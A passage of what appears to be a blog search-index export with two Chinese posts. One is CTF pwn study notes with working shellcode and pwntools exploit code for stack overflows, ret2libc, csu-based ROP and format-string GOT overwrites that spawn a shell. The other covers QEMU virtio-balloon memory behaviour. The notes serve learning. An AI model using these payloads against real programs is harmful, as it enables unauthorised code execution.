id=\"phase-1\"><a href=\"#phase-1\" class=\"headerlink\" title=\"phase 1\"></a>phase 1</h3><p>程序中存在system(“&#x2F;bin&#x2F;sh”)函数 直接把这个函数的地址覆盖至栈上的retaddr</p>\n<h3 id=\"phase-2\"><a href=\"#phase-2\" class=\"headerlink\" title=\"phase 2\"></a>phase 2</h3><p>程序中不存在system函数 在栈上写shellcode  把栈的起始地址覆盖至栈上的retaddr 执行shellcode</p>\n<p><code>b&quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80&quot;</code></p>\n<h3 id=\"phase-3\"><a href=\"#phase-3\" class=\"headerlink\" title=\"phase 3\"></a>phase 3</h3><p>栈地址随机化 只能把shellcode写到另一块地方(确定的地址) 然后更改执行流至这个确定的地址</p>\n<p>这个地址必须是可以写入数据的  text段不允许写入数据  data段可以</p>\n<p><code>readelf -S findshellcode</code>可以查看 (栈地址随机化 text段和data段地址确定)</p>\n<p>利用两次read</p>\n<ul>\n<li><p>第一次 ：栈溢出 布置栈</p>\n<p><code>pad + p32(read_addr) + p32(shellcode_addr)+p32(0)+p32(shellcode_addr)+p32(0x80)</code></p>\n<p>最后三个是read的参数 分别是stdin 写入地址 写入字节数</p>\n</li>\n<li><p>第二次：发送shellcode（加\\x00中止）</p>\n</li>\n</ul>\n<p>int 80 软中断原理：<a href=\"https://blog.csdn.net/xiaominthere/article/details/17287965\">Linux系统调用 int 80h int 0x80_xiaominthere的专栏-CSDN博客</a></p>\n<h3 id=\"phase-4\"><a href=\"#phase-4\" class=\"headerlink\" title=\"phase 4\"></a>phase 4</h3><p>程序中不存在system函数 栈不可执行 利用libc里的system函数和&#x2F;bin&#x2F;sh字符串</p>\n<p>plt 局部 别人写的库 你程序里用到了  你程序里会有一个这个函数的地址 不是真实的 会直接跳到got中</p>\n<p>got 全局 但是记录的是偏移</p>\n<p>真实地址 &#x3D; 基地址 + 偏移地址  </p>\n<p>目标：拿到基地址与偏移地址 计算system与”&#x2F;bin&#x2F;sh”的真实地址</p>\n<ul>\n<li><p>偏移地址：可由一个确定版本的libc库决定 （本地调试的时候会使用本地环境的libc导致问题）</p>\n<ul>\n<li><p>题目给了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">    libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>)</span><br><span class=\"line\">    func_offset = libc.symbols[<span class=\"string\">&#x27;func&#x27;</span>]</span><br><span class=\"line\">    str_offset = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class=\"line\">  - 题目没给</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    ```python</span><br><span class=\"line\">    libc = LibcSearcher(<span class=\"string\">&#x27;func&#x27;</span>,func_addr)<span class=\"comment\">#泄露的真实地址</span></span><br><span class=\"line\">    func_offset = libc.dump(<span class=\"string\">&#x27;func&#x27;</span>)</span><br><span class=\"line\">    str_offset = libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">- 基地址 = 真实地址 - 偏移地址  </span><br><span class=\"line\"></span><br><span class=\"line\">  `elf = ELF(<span class=\"string\">&#x27;./elf&#x27;</span>)`</span><br><span class=\"line\"></span><br><span class=\"line\">  - 需要一个在漏洞前已经执行过的函数(__libc_start_main  puts) 拿到它的真实地址</span><br><span class=\"line\"></span><br><span class=\"line\">    `puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]`</span><br><span class=\"line\"></span><br><span class=\"line\">  - 需要puts/write或其他输出的函数 把真实地址传过来</span><br><span class=\"line\"></span><br><span class=\"line\">    `puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]`</span><br><span class=\"line\"></span><br><span class=\"line\">  - 需要一个可以二次利用栈溢出的地址</span><br><span class=\"line\"></span><br><span class=\"line\">    ```python</span><br><span class=\"line\">    main = <span class=\"number\">0x123456</span><span class=\"comment\">#真实地址</span></span><br><span class=\"line\">    main = elf.symbols[<span class=\"string\">&#x27;main&#x27;</span>]</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>根据call的参数对寄存器或栈的要求 布置好内容</p>\n<p><code>payload1 = pad + p32(puts_plt) + p32(main) + p32(puts_got)</code></p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">puts_addr = u32(p.recv()[:4])</span><br><span class=\"line\">base_addr = puts_addr - puts_offset</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>最后根据地址布置好栈 调用</p>\n<p><code>payload2 = pad + p32(system_addr) + pad4 + p32(binsh_addr)</code></p>\n<p>pad4是调用system的时候push进去的retaddr binsh_addr是第一个参数</p>\n<h3 id=\"phase-5-保护全开\"><a href=\"#phase-5-保护全开\" class=\"headerlink\" title=\"phase 5 (保护全开)\"></a>phase 5 (保护全开)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rsp--&gt;  buf</span><br><span class=\"line\">...</span><br><span class=\"line\">rbp-8--&gt;  canary</span><br><span class=\"line\">rbp  --&gt;  saved rbp</span><br><span class=\"line\">rbp+8 --&gt; retaddr</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"绕过canary\"><a href=\"#绕过canary\" class=\"headerlink\" title=\"绕过canary\"></a>绕过canary</h4><p>canary为了防止被输出 最低位通常为0x0，用于截断字符串</p>\n<p>栈溢出时覆盖一位即可，可以拿到canary及其他数据</p>\n<h4 id=\"绕过ASLR-PIE\"><a href=\"#绕过ASLR-PIE\" class=\"headerlink\" title=\"绕过ASLR PIE\"></a>绕过ASLR PIE</h4><p>所有地址都是随机的，但是可以通过泄露的方式拿到</p>\n<ul>\n<li>泄露saved rbp 拿到stack地址</li>\n<li>泄露retaddr 拿到text地址</li>\n<li>main函数的retaddr里存放了__libc_start_main+243</li>\n</ul>\n<p>低12位不会被随机 可以用 <code>addr_leak &gt;&gt; 12 &lt;&lt; 12 | (addr &amp; 0xfff)</code>的方式配合ida获得任意地址</p>\n<p>或者直接partial write 只覆盖低12位</p>\n<h4 id=\"绕过NX-（ROP）\"><a href=\"#绕过NX-（ROP）\" class=\"headerlink\" title=\"绕过NX （ROP）\"></a>绕过NX （ROP）</h4><p><code>ROPgadget --binary rop_x64</code> 展示所有的gadgets</p>\n<p>栈不可执行，或栈地址随机化 </p>\n<p>只能执行其他确定地址上的任意代码，可以根据一些gadget配合栈的布置构造函数的调用</p>\n<p>以_libc_csu_init  64bit为例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class=\"line\">.text:00000000004005C0                 public __libc_csu_init</span><br><span class=\"line\">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o</span><br><span class=\"line\">.text:00000000004005C0                 push    r15</span><br><span class=\"line\">.text:00000000004005C2                 push    r14</span><br><span class=\"line\">.text:00000000004005C4                 mov     r15d, edi</span><br><span class=\"line\">.text:00000000004005C7                 push    r13</span><br><span class=\"line\">.text:00000000004005C9                 push    r12</span><br><span class=\"line\">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class=\"line\">.text:00000000004005D2                 push    rbp</span><br><span class=\"line\">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">.text:00000000004005DA                 push    rbx</span><br><span class=\"line\">.text:00000000004005DB                 mov     r14, rsi</span><br><span class=\"line\">.text:00000000004005DE                 mov     r13, rdx</span><br><span class=\"line\">.text:00000000004005E1                 sub     rbp, r12</span><br><span class=\"line\">.text:00000000004005E4                 sub     rsp, 8</span><br><span class=\"line\">.text:00000000004005E8                 sar     rbp, 3</span><br><span class=\"line\">.text:00000000004005EC                 call    _init_proc</span><br><span class=\"line\">.text:00000000004005F1                 test    rbp, rbp</span><br><span class=\"line\">.text:00000000004005F4                 jz      short loc_400616</span><br><span class=\"line\">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class=\"line\">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class=\"line\">.text:0000000000400600</span><br><span class=\"line\">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j</span><br><span class=\"line\">.text:0000000000400600                 mov     rdx, r13</span><br><span class=\"line\">.text:0000000000400603                 mov     rsi, r14</span><br><span class=\"line\">.text:0000000000400606                 mov     edi, r15d</span><br><span class=\"line\">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class=\"line\">.text:000000000040060D                 add     rbx, 1</span><br><span class=\"line\">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class=\"line\">.text:0000000000400614                 jnz     short loc_400600</span><br><span class=\"line\">.text:0000000000400616</span><br><span class=\"line\">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j</span><br><span class=\"line\">.text:0000000000400616                 add     rsp, 8</span><br><span class=\"line\">.text:000000000040061A                 pop     rbx</span><br><span class=\"line\">.text:000000000040061B                 pop     rbp</span><br><span class=\"line\">.text:000000000040061C                 pop     r12</span><br><span class=\"line\">.text:000000000040061E                 pop     r13</span><br><span class=\"line\">.text:0000000000400620                 pop     r14</span><br><span class=\"line\">.text:0000000000400622                 pop     r15</span><br><span class=\"line\">.text:0000000000400624                 retn</span><br><span class=\"line\">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>\n\n<p>可以通过如下方法执行任意函数并给三个参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">csu</span>(<span class=\"params\">rbx,rbp,r12,r13,r14,r15,addr</span>):</span><br><span class=\"line\">    <span class=\"comment\"># rdi = r15, rsi = r14, rdx = r13</span></span><br><span class=\"line\">    <span class=\"comment\"># r12 = addr of function want to call</span></span><br><span class=\"line\">    <span class=\"comment\"># rbx should be 0 and rbp should be 1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    payload = <span class=\"string\">b&#x27;A&#x27;</span> * pad + p64(fake_ebp)</span><br><span class=\"line\">    <span class=\"comment\">#ret</span></span><br><span class=\"line\">    payload += p64(csu_part2_addr) </span><br><span class=\"line\">    <span class=\"comment\">#pop rbx rbp r12 r13 r14 r15</span></span><br><span class=\"line\">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    <span class=\"comment\">#ret</span></span><br><span class=\"line\">    payload += p64(csu_part1_addr)</span><br><span class=\"line\">    <span class=\"comment\">#mov rdx rsi edi</span></span><br><span class=\"line\">    <span class=\"comment\">#call *r12</span></span><br><span class=\"line\">    <span class=\"comment\">#add rsp ,8  pop .......</span></span><br><span class=\"line\">    payload += <span class=\"string\">b&#x27;A&#x27;</span>* <span class=\"number\">56</span></span><br><span class=\"line\">    <span class=\"comment\">#ret</span></span><br><span class=\"line\">    payload += p64(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">call</span>(<span class=\"params\">addr,arg1,arg2,arg3,ret_addr</span>):</span><br><span class=\"line\">    payload = csu(<span class=\"number\">0</span>,<span class=\"number\">1</span>,addr,arg3,arg2,arg1,ret_addr)</span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<p>第一次利用：write 泄露地址，拿到libc基址</p>\n<p>第二次利用：read bss段写入system地址</p>\n<p>第三次利用：read bss段写入&#x2F;bin&#x2F;sh 或&#x2F;bin&#x2F;bash</p>\n<p>第四次利用：执行bss段记录的system函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">call(puts_got,puts_got,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br><span class=\"line\">puts_addr = u64(p.recv(<span class=\"number\">7</span>)[:<span class=\"number\">6</span>]+<span class=\"string\">b&#x27;\\x00\\x00&#x27;</span>)</span><br><span class=\"line\">libc_base = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">call(gets_got,bss_base+<span class=\"number\">0x100</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br><span class=\"line\"><span class=\"comment\"># sendline send matters</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\">call(gets_got,bss_base+<span class=\"number\">0x200</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br><span class=\"line\">p.sendline(p64(system_addr))</span><br><span class=\"line\">call(bss_base+<span class=\"number\">0x200</span>,bss_base+<span class=\"number\">0x100</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,main_addr)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"格式化字符串-format-string\"><a href=\"#格式化字符串-format-string\" class=\"headerlink\" title=\"格式化字符串(format string)\"></a>格式化字符串(format string)</h2><p><code>printf(&quot;%p%p&quot;)</code>遇到%会默认有后续参数，然后拿到值进行输出，并不会检查参数个数</p>\n<p>64位情况下 格式化字符串本身是rdi，第一个%会输出rsi 后续是rdx rcx r8 r9</p>\n<p>第六个%开始会输出栈上的数据</p>\n<ul>\n<li><p>%p 输出8字节的数据</p>\n</li>\n<li><p>%s 把数据作为字符串的首地址 输出此地址对应的字符串(\\0截断) 可用于泄露任意地址</p>\n</li>\n<li><p>%n 把已经输出的字节个数写入此数据对应的地址中 可用于修改任意地址</p>\n</li>\n<li><p>%k$p 输出第k个位置的数据</p>\n</li>\n<li><p>%kc 输出k bytes的字符</p>\n</li>\n</ul>\n<h3 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h3><p>找到格式化字符串本身在栈上的位置，可用<code>AAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code>查看哪个位置出现0x41 假设为k</p>\n<p><code>payload=&#39;addr&#39;+&#39;%k$s&#39;</code> 可用输出addr</p>\n<p>但由于地址为小端 且64位有8bytes地址 会被\\0截断 所以需要把地址放后面</p>\n<p><code>payload = &#39;%k+1$s&#39;+pad+&#39;addr&#39;</code> 前面凑8bytes  addr右移一位(8bytes)</p>\n<h3 id=\"修改地址\"><a href=\"#修改地址\" class=\"headerlink\" title=\"修改地址\"></a>修改地址</h3><p><code>payload = &#39;%&#123;x&#125;c%&#123;k&#125;$n&#39;+ pad + addr</code> 把addr放到第k个位置 先用<code>%&#123;x&#125;c</code>输出x个字符 然后数值x会写入地址addr中</p>\n<ul>\n<li>n 4bytes</li>\n<li>hn 2bytes</li>\n<li>hhn 1byte</li>\n</ul>\n<p>例如修改printf的got表（0x601028）中存储的地址为system地址（0x7f9940d4f3a0）</p>\n<p>可以一次写入2bytes 注意是小端</p>\n<p>0x601028 地址存入0xf3a0</p>\n<p>0x60102a 地址存入0x40d4</p>\n<p>0x60102c 地址存入0x7f99</p>\n<p>一次写1byte 会导致payload太长 可能破坏了栈</p>\n<p>一次写4byte 会导致输出的字符输太多 太慢</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">printf_got = elf.got[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%7$sAAAA&#x27;</span>.encode() + p64(printf_got)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Format String\\n&#x27;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">recv = p.recv()</span><br><span class=\"line\">printf_addr = u64(recv[:<span class=\"number\">6</span>]+<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">2</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">libc_base = printf_addr - libc.symbols[<span class=\"string\">&#x27;printf&#x27;</span>]</span><br><span class=\"line\">sys_addr = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">sys_addr_array = <span class=\"built_in\">bytearray</span>.fromhex(<span class=\"built_in\">hex</span>(sys_addr)[<span class=\"number\">2</span>:])</span><br><span class=\"line\">c = [<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>,<span class=\"number\">0</span>,-<span class=\"number\">1</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">        c[j] *= <span class=\"number\">256</span></span><br><span class=\"line\">        c[j] += sys_addr_array[-i-j*<span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">k = <span class=\"number\">12</span></span><br><span class=\"line\">block = <span class=\"number\">16</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">f1 =  <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;c[<span class=\"number\">0</span>]&#125;</span>c%<span class=\"subst\">&#123;k&#125;</span>$hn&#x27;</span></span><br><span class=\"line\">pad = block-<span class=\"built_in\">len</span>(f1)</span><br><span class=\"line\">payload += f1 + <span class=\"string\">&#x27;A&#x27;</span> * pad </span><br><span class=\"line\"><span class=\"built_in\">print</span>(c[<span class=\"number\">0</span>])</span><br><span class=\"line\">acc = c[<span class=\"number\">0</span>] + pad </span><br><span class=\"line\">c[<span class=\"number\">1</span>] -= acc</span><br><span class=\"line\"><span class=\"keyword\">while</span> c[<span class=\"number\">1</span>] &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    c[<span class=\"number\">1</span>] += <span class=\"number\">2</span>**<span class=\"number\">16</span></span><br><span class=\"line\">f2 =  <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;c[<span class=\"number\">1</span>]&#125;</span>c%<span class=\"subst\">&#123;k+<span class=\"number\">1</span>&#125;</span>$hn&#x27;</span></span><br><span class=\"line\">pad = block-<span class=\"built_in\">len</span>(f2)</span><br><span class=\"line\">payload += f2 + <span class=\"string\">&#x27;A&#x27;</span> * pad </span><br><span class=\"line\"><span class=\"built_in\">print</span>(acc+c[<span class=\"number\">1</span>])</span><br><span class=\"line\">acc += c[<span class=\"number\">1</span>] + pad </span><br><span class=\"line\">c[<span class=\"number\">2</span>] -= acc</span><br><span class=\"line\"><span class=\"keyword\">while</span> c[<span class=\"number\">2</span>] &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    c[<span class=\"number\">2</span>] += <span class=\"number\">2</span>**<span class=\"number\">16</span></span><br><span class=\"line\">f3 =  <span class=\"string\">f&#x27;%<span class=\"subst\">&#123;c[<span class=\"number\">2</span>]&#125;</span>c%<span class=\"subst\">&#123;k+<span class=\"number\">2</span>&#125;</span>$hn&#x27;</span></span><br><span class=\"line\">pad = block-<span class=\"built_in\">len</span>(f3)</span><br><span class=\"line\">payload += f3 + <span class=\"string\">&#x27;A&#x27;</span> * pad</span><br><span class=\"line\"><span class=\"built_in\">print</span>(acc+c[<span class=\"number\">2</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload = payload.encode()</span><br><span class=\"line\">payload += p64(printf_got)</span><br><span class=\"line\">payload += p64(printf_got+<span class=\"number\">2</span>)</span><br><span class=\"line\">payload += p64(printf_got+<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;/bin/bash&#x27;</span>)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\">&lt;/code&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h2><h3 id=\"ida\"><a href=\"#ida\" class=\"headerlink\" title=\"ida\"></a>ida</h3><ul>\n<li>F5 看C语言  空格 看汇编</li>\n<li>shift+F12 看字符串</li>\n<li>右键可以找到引用地址  重命名等</li>\n<li>展示的汇编是intel语法 AT&amp;T可以通过<code>objdump -d xx &gt;&gt; xx.txt</code>查看</li>\n</ul>\n<h3 id=\"pwntools\"><a href=\"#pwntools\" class=\"headerlink\" title=\"pwntools\"></a>pwntools</h3><ul>\n<li>remote 远程 process本地</li>\n<li>ELF 加载.so</li>\n<li>gdb.attach 本地调试</li>\n<li>sendline,recv,recvuntil</li>\n<li>p64,u64</li>\n</ul>\n<h3 id=\"pwngdb\"><a href=\"#pwngdb\" class=\"headerlink\" title=\"pwngdb\"></a>pwngdb</h3><ul>\n<li>run运行到断点或结束  start从第一行开始运行</li>\n<li>x 地址或$寄存器  看数据 &#x2F;g 8bytes &#x2F;s字符串</li>\n<li>info reg 看寄存器</li>\n<li>b *地址&#x2F;label 断点  c继续 si单步 n不进入函数 finish跳出函数</li>\n<li>got 看got表 vmmap看内存地址分布</li>\n</ul>\n<h3 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h3><p><code>ROPgadget --binary xxx</code></p>\n<ul>\n<li>–string</li>\n<li>grep</li>\n</ul>\n<h3 id=\"checksec\"><a href=\"#checksec\" class=\"headerlink\" title=\"checksec\"></a>checksec</h3><p><code>checksec xxx</code></p>\n<h2 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h2><ul>\n<li>recvuntil 最后加不加\\n</li>\n<li>sendline与send不同 导致重复</li>\n</ul>\n","categories":["ctf"]},{"title":"balloon","url":"/2024/01/22/virtualization/balloon/","content":"<h1 id=\"balloon\"><a href=\"#balloon\" class=\"headerlink\" title=\"balloon\"></a>balloon</h1><h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><ul>\n<li>guest使用的内核在编译时需要把config_virtio_balloon的选项打开，可以y直接编译进内核 也可以m作为模块手动加载</li>\n<li>qemu启动时加入virtio-balloon选项</li>\n</ul>\n<p>进入虚拟机后ctrl a c进入qemu monitor</p>\n<ul>\n<li>info balloon查看当前balloon大小，默认为qemu启动时指定的最大内存</li>\n<li>balloon xxx(mb) 调整大小</li>\n</ul>\n<p>显示的balloon大小为VM真实可用的内存，剩下的给host</p>\n<ul>\n<li>如果不加入deflate-on-oom参数，VMfree -mh显示内存为balloon大小 超过此大小触发oom killer</li>\n<li>如果加入此参数，VM free -mh显示启动指定的最大参数，但是used显示分给host的值 超过balloon大小会自动调大balloon</li>\n</ul>\n<p><a href=\"https://www.linux-kvm.org/page/Projects/auto-ballooning#TODO\">Projects&#x2F;auto-ballooning - KVM (linux-kvm.org)</a></p>\n<p>auto balloon似乎被废弃了</p>\n<p><a href=\"https://www.ovirt.org/develop/projects/mom.html\">MoM | oVirt</a>这个工具可能可用</p>\n<p>qmp:</p>\n<ul>\n<li>balloon  value</li>\n<li>query-balloon</li>\n</ul>\n<h2 id=\"现象\"><a href=\"#现象\" class=\"headerlink\" title=\"现象\"></a>现象</h2><p>host guest1 guest2均为4G内存</p>\n<ol>\n<li>guest1要2G 从内存分配</li>\n<li>guest2要2G swap掉guest1</li>\n<li>guest1要2G swap掉guest2</li>\n</ol>\n<p><strong>1 正常情况  guest2要内存 host内存不够 回收 但是guest1的2G被swap</strong> 从htop中guest1的qemu 进程mem占用情况可以看出来</p>\n<p>ctrl a c 输入info balloon &#x2F;balloon xxx (MB)</p>\n<p>balloon后面的数字代表VM真实可用内存(不参与balloon) 这个值不能超过qemu启动分配的内存</p>\n<p>balloon目前找不到合适的自动化监控，需要手动用qemu调</p>\n<p><strong>2 guest2需要很多内存的时候手动进guest1的qemu monitor 调小balloon 然后reclaim会直接回收而不是swap</strong></p>\n<p>balloon只会回收guest内存 不会回收host上被swap的guest的页</p>\n<p><a href=\"https://zhidao.baidu.com/question/1519495184466483140.html\">KVM之四：内存balloon的奇妙_百度知道 (baidu.com)</a></p>\n<blockquote>\n<p>目前没有比较方便的、自动化的机制来管理ballooning，一般都是采用在QEMU monitor中执行balloon命令来实现ballooning的。没有对VM的有效监控，没有自动化的ballooning机制，这可能会让生产环境中实现大规模自动化部署并不很方便。</p>\n</blockquote>\n<p><strong>3 如果memhog后sleep 持续占用内存 那balloon会直接把这个进程kill掉 强行拿掉VM的内存</strong></p>\n<p>所以用balloon和不用在结果上是有很大区别的。不用balloon host会把VM的所有内存都swap掉 不管free与否；用balloon host会强行回收VM内存 如果不够就让VMkill自己的进程 </p>\n<p><strong>4 如果VM配了 swap VM会swap</strong></p>\n<blockquote>\n<p>如果有大量内存从VM系统中回收，Ballooning可能会降低VM操作系统运行的性能。一方面，内存的减少，可能会让VM中作为磁盘数据缓存的内存被放到气球中，从而VM中的磁盘I&#x2F;O访问会增加；另一方面，如果处理机制不够好，也可能让VM中正在运行的进程由于内存不足而执行失败。</p>\n</blockquote>\n<p>[<a href=\"https://listman.redhat.com/archives/libvir-list/2015-December/msg00494.html\">libvirt] [PATCH 2&#x2F;2] qemu: add support of optional ‘deflate-on-oom’ attribute (redhat.com)</a></p>\n<p>qemu中可以加入deflate-on-oom的选项，这时候配置了balloon并不会让VM的可用内存变小，而是在VM可用内存不变的情况下增加了Used，之后不会影响VM程序的正常使用。<strong>5 当VM需要的内存大于balloon配置之后，会自动进行deflate 向host要内存 此时info balloon可以看到balloon的值被自动调大了</strong>。但是被调大之后是不会再自动缩小的</p>\n<p><strong>6 VM自己swap的优先级是比deflate-on-oom的优先级高的</strong></p>\n<p><strong>7 在VMlogout的时候 balloon进行回收 仍然能回收到</strong></p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p><a href=\"https://www.cnblogs.com/edver/p/14684138.html\">virtio简介（二） —— virtio-balloon guest侧驱动 - Edver - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"http://ssdxiao.github.io/linux/2017/03/20/Virtio-Balloon.html\">Virtio-Balloon超详细分析 (ssdxiao.github.io)</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">virtio_driver</span> <span class=\"title\">virtio_balloon_driver</span> =</span> &#123;</span><br><span class=\"line\">\t.feature_table = features,</span><br><span class=\"line\">\t.feature_table_size = ARRAY_SIZE(features),</span><br><span class=\"line\">\t.driver.name =\tKBUILD_MODNAME,</span><br><span class=\"line\">\t.driver.owner =\tTHIS_MODULE,</span><br><span class=\"line\">\t.id_table =\tid_table,</span><br><span class=\"line\">\t.validate =\tvirtballoon_validate,</span><br><span class=\"line\">\t.probe =\tvirtballoon_probe,</span><br><span class=\"line\">\t.remove =\tvirtballoon_remove,</span><br><span class=\"line\">\t.config_changed = virtballoon_changed,</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_PM_SLEEP</span></span><br><span class=\"line\">\t.freeze\t=\tvirtballoon_freeze,</span><br><span class=\"line\">\t.restore =\tvirtballoon_restore,</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>本身暴露的接口并不多 可以认为就<code>virtballoon_changed</code>一个</p>\n<p>这个内核模块是前端</p>\n<p>需要qemu添加<code>-device virtio-balloon-pci</code>在宿主机上创建一个balloon后端</p>\n<p>qemu monitor中的balloon指令会向VM中的驱动发送指令，从而调用<code>virtballoon_changed</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __virtio_config_changed(<span class=\"keyword\">struct</span> virtio_device *dev)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">virtio_driver</span> *<span class=\"title\">drv</span> =</span> drv_to_virtio(dev-&gt;dev.driver);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!dev-&gt;config_enabled)</span><br><span class=\"line\">\t\tdev-&gt;config_change_pending = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (drv &amp;&amp; drv-&gt;config_changed)</span><br><span class=\"line\">\t\tdrv-&gt;config_changed(dev);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>update_balloon_size_func</code> 每次<code>virtballoon_changed</code>只会发生一次 但是调整大小的函数会触发很多次 不是一次性调整好的，并且<code>virtballoon_changed</code>是异步。如果每次update输出时间影响效率</p>\n<p>内核启动时<code>vp_find_vqs_intx</code>注册<code>vp_interrupt</code> 之后向队列写入信息时会产生中断</p>\n<p><code>vp_interrupt</code>-&gt;<code>vp_config_changed</code>-&gt;<code>virtio_config_changed</code>-&gt;<code>__virtio_config_changed</code></p>\n<p>注册vp_interrupt的函数 追踪调用 发现是probe的init_vqs probe由virio_bus的probe调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span 